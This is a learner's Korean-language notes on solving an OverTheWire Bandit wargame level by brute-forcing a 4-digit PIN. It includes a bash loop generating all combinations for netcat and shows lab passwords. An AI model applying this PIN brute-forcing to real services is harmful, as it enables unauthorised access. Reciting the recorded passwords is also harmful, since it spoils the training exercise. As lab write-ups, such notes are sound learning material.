#### A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. </br>There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. </br>You do not need to create new connections each time


#### bandit23-24 password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8



### 문제풀이
---
* daemon은 30002포트에서 리스닝중.
* bandit24 비밀번호, secret numeric 4-digit pincode를 주면 bandit25비밀번호 반환.
* brute-forcing으로 해결

* ssh bandit25@bandit.labs.overthewire.org -p 30002

* 접속해서 비밀번호, pin code줘도 반응 없으니 -v옵션으로 로그 확인

* wx권한 있는 /tmp 디렉터리에 폴더 만들고 파일 생성
```
mkdir /tmp/pindir
vim /tmp/pindir/pinmaker.sh
```


```
// pinmaker.sh
#! bin/bansh
// ssh로 bandit25에 연결시도
// bandit24 비밀번호로 접속
// 접속 성공시 bandit24 비밀번호 전달
// pin code조합 전달
ssh bandit25@bandit.labs.overthewire.org -p 30002
```
이 파일을 bandit24에다가 만들어야 하는지 bandit25에다 만들어야 하는지ㅣㅣㅣㅣㅣㅣㅣㅣㅣㅣㅣㅣㅣㅣㅣㅐㅣ

bandit25에는 ssh접속 해봤자 비밀번호와 핀코드밖에 입력 못함ㅁ.............

* ssh bandit25@bandit.labs.overthewire.org -p 30002 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000' </br> 이런식으로 작성하면 ssh접속후 ''안의 command를 바로 실행 할 수 있지만 매번 새로운 연결을 생성할 필요는 없다고 했으니 다른, 더 좋은 방법이 있을거임.

* ssh user@host /tmp/fvdir/fvfile.sh 처럼 연결후 파일을 실행시킬수 있음
```
#! /bin/bash
//그냥 0000부터 9999까지 while문 돌리면 될듯 // %04d
while [${pin} -le 9999]
do
    printf 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0${pin}d'
done
```
/tmp/pindir/pinmaker.sh 만들고 실행 -> permission denied
```
chmod 777 /tmp/pindir/pinmaker.sh
```
재실행 
```
/tmp/pindir/pinmaker.sh: line 2: [: missing `]'
```
```
#!/bin/bash
pin=0
while (( pin <= 9999 )); do
  printf 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %04d\n' "$pin"
  ((pin++))
done
```
ssh user@host 'bash -s -- arg1 arg2' < local_script.sh

ssh -v bandit25@bandit.labs.overthewire.org -p 30002 'bash -s -- ' < /tmp/pindir/pinmaker.sh


이거 ssh가 아니라 localhost로 보내는거임.

bandit25 user로 요청을 보내라는 말이 아니라.

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001

nc localhost 30002

shell script로 nc연결후 bandit24 pw pincode 제출

```
#!/bin/bash


```

* cat /tmp/pindir/pinmaker.txt | nc localhost 30002

이렇게 하면 pinmaker.txt에 있는 행들이 서버에서 실행? 됌/

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0000
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0001
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0002
...
이런 형식의 행을 9999까지 만든 파일이 필요
```

```
#!/bin/bash
pin=0
: > pintext.txt  # 초기화(옵션)
while (( pin <= 9999 )); do
  printf 'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %04d\n' "$pin" >> pintext.txt
  ((pin++))
done
```

iCi86ttT4KSNe1armKiwbQNmB3YJP3q4